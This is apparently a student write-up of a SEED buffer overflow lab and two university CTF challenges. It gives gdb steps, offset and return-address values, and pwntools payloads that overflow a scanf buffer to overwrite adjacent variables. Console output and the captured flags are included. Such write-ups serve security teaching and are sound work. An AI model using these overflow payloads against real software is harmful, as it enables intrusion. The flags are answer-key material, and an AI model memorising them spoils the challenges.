# Buffer Overflow Attack Lab (Set-UID Version)

## Task 1

Both of the programs seem to work the same, no output errors and both successfully run shell command

## Task 2

![Task 2 screenshot](images/Lab2Task2.png)

## Task 3

- Created *badfile*, compiled using make and used gdb to debug the file stack-L1-dbg
- Created a breakpoint in the function *bof*
- Write *run* to start executing the program, followed by *next* to execute a few instructions and stop after the **ebp** register is modified to point to the stack.
- Check **ebp** value using `p $ebp`: 0xffffc978
- Check the variable **buffer** value using `p &buffer`: 0xffffc90c
- Run `x/100 0xffffc90c` to get the address
- Insert the values in the `exploit.py` script
- We gave `start` the value 200, a value big enough to fill the code with NOPs to reach the return address
- We gave `ret` the address 0xffffc9cc, a value selected some registers after the return address to have room to execute the shell code
- We gave `offset` the value 112 because it's the register difference between the buffer and the str pointer, (100 + 8 + 4)

# Capture The Flag

## Challenge 1:

- Installation of the library `pwntools` and downloaded the files provided for this CTF.
- Executed the `checksec program` command to analyse the program compilation protections.
- The file opened by the program is stored in the variable `meme_file`.
- There is a way to control the open file if we change de meme_file value.
- There is a `scanf` that reads 28 characters from the variable `buffer` which has a size of 20 characters, therefore a buffer overflow is possible by using the 8 extra bytes.
- Therefore, in the `scanf` input, we must submit a string like `12345678901234567890flag.txt`, setting those extra bytes to **flag.txt** in order to override the value of the `meme_file` variable, which will be then read in the `fopen` call.
- Therefore, to explore this vulnerability, we changed the text sent in the python script to `r.sendline(b"12345678901234567890flag.txt")` and obtained the desired flag.
- Submit 1st flag ("**flag{bd5845361bcae9b37f62787760b5763b}**")

```
    [11/27/21]seed@VM:~/.../ctf-5$ python3 exploit-example.py
    [+] Opening connection to ctf-fsi.fe.up.pt on port 4003: Done
    [] Switching to interactive mode
    Echo 12345678901234567890flag.txt
    I like what you got!
    flag{bd5845361bcae9b37f62787760b5763b}
    [] Got EOF while reading in interactive
    $
```

## Challenge 2:

- Downloaded the files provided for the second challenge of this CTF.
- Executed the `checksec program` command to analyse the program compilation protections, concluded that the architecture is i386-32-little.
- This time, the program contains the following variables:
```c
    char meme_file[8] = "mem.txt\0";
    char val[4] = "\xef\xbe\xad\xde";
    char buffer[20];
```
- There is still a buffer overflow issue due to the `scanf` function allowing 32 characters to be read
```c
scanf("%32s", &buffer);
```
Given that the buffer only contains 20 characters and we are allowed to insert 32, we can use the buffer overflow vulnerability to override the `val[4]` and `meme_file[8]` arrays.
- In order to read from the file, the following condition must be met:
```c
if(*(long*)val == 0xfefc2122)
```
To do so, we have to make `val` equal to the aforementioned address.
- Knowing that the architecture is i386-32-little, we must convert this address to little-endian ordering, using the python function `to_bytes`.

```python
ret = 0xfefc2122  ### Desired Address
bts = (ret).to_bytes(L,byteorder='little') ### Address convertion to bytes in little endian
```

- Therefore, in order to exploit this vulnerability, we now need to make the message read by `scanf` to have the following format:
    - bytes[0:19] -> Random bytes
    - bytes[20:23] -> Little-endian bytes representation of the desired address
    - bytes[24:31] -> 'flag.txt' string, in bytes

- To do so, the `sendline` command of our script must be changed to:
```python
r.sendline(b"12345678901234567890" + bts + b"flag.txt")
```
- Now, by simply running our described script, we obtained the following output, which allowed us to obtain the requested flag.

```console
[11/27/21]seed@VM:~/.../step2$ python3 exploit.py
[+] Opening connection to ctf-fsi.fe.up.pt on port 4000: Done
[*] Switching to interactive mode
I like what you got!
flag{9acfa2344e8a8dfd9949d1be42732518}
[*] Got EOF while reading in interactive
$  
```

- Submit 2nd flag ("**flag{9acfa2344e8a8dfd9949d1be42732518}**")